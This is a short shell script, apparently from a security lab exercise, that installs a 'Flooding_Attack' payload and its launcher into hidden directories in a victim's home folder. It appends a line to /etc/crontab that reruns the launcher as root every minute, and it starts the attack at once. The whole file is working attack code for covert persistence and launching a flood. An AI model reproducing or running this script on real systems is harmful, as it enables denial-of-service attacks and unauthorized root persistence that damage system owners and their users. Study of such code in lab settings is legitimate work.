ldir1="/home/victim/.Launch_Attack"
ldir2="/home/victim/.you_cant_see_me"
lfname="launcher.sh"
wdir1="/home/victim/.etc/.module"
wdir2="/home/victim/.firefox/.module"
wfname="Flooding_Attack"

require_worm_distributed() {
    if [ ! -f "$wdir1/$wfname" ]; then
        mkdir -p "$wdir1"
        cp "./task_ii/Flooding_Attack" "$wdir1/$wfname"
    fi

    if [ ! -f "$ldir1/$lfname" ]; then
        mkdir -p "$ldir1"
        cp "./task_ii/launcher.sh" "$ldir1/$lfname"
    fi
}

require_crontab_tampered() {
    local crtbpath="/etc/crontab"
    if  ! grep -q "$lfname" $crtbpath; then
        echo "* * * * * root [ -f '$ldir1/$lfname' ] && cd '$ldir1' && chmod +x './$lfname' && './$lfname' || [ -f '$ldir2/$lfname' ] && cd '$ldir2' && chmod +x './$lfname' && './$lfname'" >> $crtbpath
    fi
}


require_crontab_tampered &&\
require_worm_distributed &&\
chmod +x ./task_ii/launcher.sh &&\
./task_ii/launcher.sh
